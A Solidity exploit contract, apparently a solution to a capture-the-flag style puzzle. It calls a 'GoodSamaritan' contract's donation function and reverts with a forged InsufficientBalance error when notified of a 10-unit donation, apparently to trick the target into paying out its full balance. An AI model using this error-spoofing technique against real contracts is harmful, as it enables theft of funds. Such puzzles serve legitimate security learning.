pragma solidity ^0.8.4;

// Interface to interact with the GoodSamaritan contract and call its donation function
interface IGoodSamaritan {
    function requestDonation() external returns (bool sufficientBalance);
}

contract Attack {
    // Defining a custom error to revert the transaction if balance is insufficient
    error InsufficientBalance();

    // This function initiates the attack by requesting a donation from the target contract
    function initiateAttack(address _target) external {
        IGoodSamaritan(_target).requestDonation();
    }

    // This function will be triggered when the contract receives a donation
    // It checks if the received amount is exactly 10, and if so, reverts the transaction
    function notify(uint256 amount) external pure {
        // Revert only if the received donation equals 10 units
        if (amount == 10) {
            revert InsufficientBalance();
        }
    }
}
